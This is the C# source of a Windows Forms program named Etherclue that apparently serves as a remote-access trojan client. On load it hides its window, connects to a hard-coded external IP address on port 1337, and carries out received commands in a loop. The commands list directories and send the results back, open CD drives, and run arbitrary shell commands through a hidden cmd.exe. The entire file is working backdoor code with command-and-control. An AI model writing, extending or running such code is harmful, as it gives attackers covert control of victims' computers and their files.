using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Etherclue
{
    public partial class EtherclueMain : Form
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        clsSocket socket;
        public EtherclueMain()
        {
            InitializeComponent();
        }

        private void EtherclueMain_Shown(object sender, EventArgs e)
        {
            
        }

        private void EtherclueMain_Load(object sender, EventArgs e)
        {
            if (!Program.debug)
            {
                this.Hide();
            }
            socket = new clsSocket("64.52.86.179", 1337);
            CheckCommand(new Command(socket.Receive(), false));
        }

        private void CheckCommand(Command cmd)
        {
            List<string> responses = new List<string>();
            //if (Program.debug)
               // MessageBox.Show(cmd.GottenRequest());
            switch (cmd.GottenRequest().Split(' ')[0])
            {
                case "dir":
                    foreach(string dir in Directory.GetDirectories(cmd.GottenRequest().Substring(4).Replace("\"", "").Replace("'", "")))
                    {
                        responses.Add("./" + dir.Split('/', '\\')[dir.Split('/', '\\').Length - 1]);
                    }
                    foreach (string dir in Directory.GetFiles(cmd.GottenRequest().Substring(4).Replace("\"", "").Replace("'", "")))
                    {
                        responses.Add(dir.Split('/', '\\')[dir.Split('/', '\\').Length - 1]);
                    }
                    break;

                case "eject":
                    DriveInfo[] allDrives = DriveInfo.GetDrives();
                    int diskcounter = 1;
                    foreach (DriveInfo drive in allDrives)
                    {
                        if (drive.DriveType.ToString() == "CDRom")
                        {
                            mciSendStringA("open " + drive.Name + ": type CDaudio alias drive" + diskcounter, "return", 0, 0);
                            mciSendStringA("set drive" + diskcounter + " door open", "return", 0, 0);
                            diskcounter++;
                            responses.Add("The client's CDRom/DVDRom drive " + drive.Name + " has opened");
                        }
                    }
                    break;

                case "exec":
                    Process p = new Process();
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/k \"" + cmd.GottenRequest().Substring(5) + "\"";
                    p.Start();
                    break;

                    //case "":
                    //  break;

                    //default:
                    //  responses.Add("Unknown command!");
                    //break;

            }
            if(responses.Count > 0)
            {
                foreach(string response in responses)
                {
                    socket.Send(new Command(response, true).SendRequest());
                }
            }
            CheckCommand(new Command(socket.Receive(), false));
        }

        private void EtherclueMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            //socket.Send(new Command("Client disconnected", true).SendRequest());
            socket.Close();
        }

        private void EtherclueMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            //socket.Send(new Command("Client disconnected", true).SendRequest());
            socket.Close();
        }
    }
}